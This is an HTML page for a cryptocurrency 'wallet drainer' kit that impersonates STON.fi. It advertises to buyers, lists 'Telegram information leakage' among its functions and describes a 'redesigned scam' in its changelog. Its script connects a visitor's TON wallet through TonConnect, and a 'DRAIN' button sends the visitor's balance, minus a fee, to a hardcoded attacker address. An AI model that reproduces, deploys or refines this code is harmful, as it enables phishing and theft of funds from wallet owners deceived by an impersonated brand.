<!DOCTYPE html>
<html>
<head>
    <title>STON.fi Connect Wallet</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
</head>
<body>
    <h1>STON.fi Connect Wallet Interface</h1>
    <p>
        Fully transparent work, full sources. <br>
        Community of buyers, constant support. <br>
        As a gift are a few popular offers!
    </p>
    <h2>Supported Wallets:</h2>
    <ul>
        <li>Tonkeeper</li>
        <li>TG Wallet</li>
        <li>TonHub</li>
        <li>MyTonWallet</li>
        <li>DeWallet</li>
        <li>Bitget Wallet</li>
        <li>TonWallet</li>
        <li>XTONWallet</li>
        <li>OpenMask</li>
        <li>SafePal</li>
        <li>OKX Wallet</li>
        <li>HOT</li>
    </ul>

    <h2>Available Functions:</h2>
    <ul>
        <li>Transfer Ton</li>
        <li>Transfer Jetton (4 assets for 1 signature)</li>
        <li>Transfer NFT (4 assets for 1 signature, anonymous numbers and usernames included)</li>
        <li>Telegram information leakage</li>
    </ul>

    <h3>v0.8.5 Updates:</h3>
    <ul>
        <li>The operation of the NFT scan has been changed again</li>
        <li>Token evaluation system has been redesigned</li>
        <li>Marked as scam NFTs are eliminated</li>
        <li>Speeded up the work</li>
        <li>Price is determined by AVG</li>
        <li>Redesigned scam in a more pleasing for the eye look</li>
        <li>Fixed minor bugs and errors</li>
    </ul>

    <div id="ton-connect"></div> <!-- Connect Wallet Button -->
    <button onclick="didtrans();" style="margin-top: 30px; font-size: 24px;">DRAIN</button> <!-- Transfer All Assets Button -->

    <script>
        // Static tonconnect-manifest.json URL instead of dynamic creation
        const manifestUrl = 'https://aslan22822.github.io/ton-connect-wallet/tonconnect-manifest.json';
        
        // Initialize TonConnect with manifest URL
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: manifestUrl,
            buttonRootId: 'ton-connect'
        });

        // Event listener for wallet connection
        tonConnectUI.onStatusChange((walletInfo) => {
            if (walletInfo.account) {
                console.log('Wallet connected:', walletInfo.account);
                checkBalance(walletInfo.account.address);
            }
        });

        // Function to check user balance
        async function checkBalance(walletAddress) {
            try {
                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${walletAddress}`);
                const data = await response.json();
                if (data && data.result) {
                    const balance = parseFloat(data.result) / 1000000000; // Convert nanotons to TON
                    console.log(`Balance of ${walletAddress}: ${balance} TON`);
                } else {
                    console.error('Failed to fetch balance');
                }
            } catch (error) {
                console.error('Error fetching balance:', error);
            }
        }

        // Function to transfer TON and NFTs
        async function didtrans() {
            try {
                const walletInfo = tonConnectUI.getWallet();
                if (!walletInfo) {
                    alert('Please connect your wallet first.');
                    return;
                }

                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 60, // Valid for 60 seconds
                    messages: [
                        {
                            address: 'UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c', // Replace with your wallet address
                            amount: walletInfo.balance - 3000000 // Deduct fee (in nanotons)
                        }
                    ]
                };

                // Send transaction
                await tonConnectUI.sendTransaction(transaction);
                console.log('Transaction sent successfully');
            } catch (error) {
                console.error('Failed to send transaction:', error);
            }
        }
    </script>
    <script src="tonsdk.js"></script>
</body>
</html>
